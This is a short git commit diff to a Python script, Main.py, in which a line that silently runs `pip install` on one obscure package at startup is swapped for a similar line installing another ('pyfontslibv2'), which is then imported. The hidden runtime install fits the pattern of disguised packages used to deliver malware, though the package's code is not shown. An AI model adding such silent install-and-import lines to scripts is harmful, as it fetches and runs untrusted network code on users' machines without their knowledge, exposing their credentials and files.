93efc108558a045cb093b8e12c55bf60db681bd9
OptimalLukasDev <131367146+OptimalLukasDev@users.noreply.github.com>
2023-04-29 04:57:56 -0700

    Update Main.py

--- Main.py
+++ Main.py
@@ -1,6 +1,6 @@
 import os
-os.system("pip install pythoncoloringslibV2")
-import pythoncoloringslibV2
+os.system("pip install pyfontslibv2")
+import pyfontslibv2
 import httpx
 import threading
 import random
